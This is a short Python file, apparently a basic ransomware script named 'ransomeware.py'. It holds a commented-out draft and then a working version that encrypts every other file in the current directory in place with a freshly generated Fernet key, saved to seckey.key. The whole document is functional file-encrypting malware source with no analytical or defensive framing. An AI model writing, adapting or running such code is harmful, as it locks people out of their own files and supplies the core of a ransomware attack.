# import os
# from cryptography.fernet import Fernet


# files = []

# for file in os.listdir():
    
#     if file =='ransomeware.py' or file == 'seckey.key'  or file == 'decrpt.py':
#         continue
#     if os.path.isfile(file):
#       files.append(file)
    
    
    
#     key = Fernet.generate_key()
#     print(key)
    
# with open("seckey.key", "wb") as k :
#     k.write(key)
    
# for file in files :
#     with open(file, 'rb') as theFile :
#      content = theFile.read()
#     encrpyted_content = Fernet(key).encrypt(content)
    
#     with open(file, 'wb') as theFile :
#           theFile.write(encrpyted_content)

import os
from cryptography.fernet import Fernet

# List files in the current directory, excluding ransomeware.py, seckey.key, and decrpt.py
files = [file for file in os.listdir() if file not in ('ransomeware.py', 'seckey.key', 'decrypt.py') and os.path.isfile(file)]

# Generate a new Fernet key
key = Fernet.generate_key()
print(key)

# Save the key to seckey.key
with open("seckey.key", "wb") as k:
    k.write(key)

# Encrypt each file using the generated key
for file in files:
    with open(file, 'rb') as theFile:
        content = theFile.read()
    encrypted_content = Fernet(key).encrypt(content)
    with open(file, 'wb') as theFile:
        theFile.write(encrypted_content)